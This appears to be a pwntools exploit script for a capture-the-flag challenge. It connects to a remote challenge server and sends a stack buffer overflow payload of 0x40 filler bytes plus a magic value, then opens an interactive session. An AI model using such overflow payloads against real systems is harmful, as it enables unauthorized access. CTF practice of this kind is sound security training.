from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

# vuln_path = "./pwn"
# elf = ELF(vuln_path)
# libc = elf.libc

io = remote("host3.metaproblems.com", 5980)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


payload = b"a"*0x40+p32(0x44524942)+p32(1)

io.sendline(payload)

io.interactive()
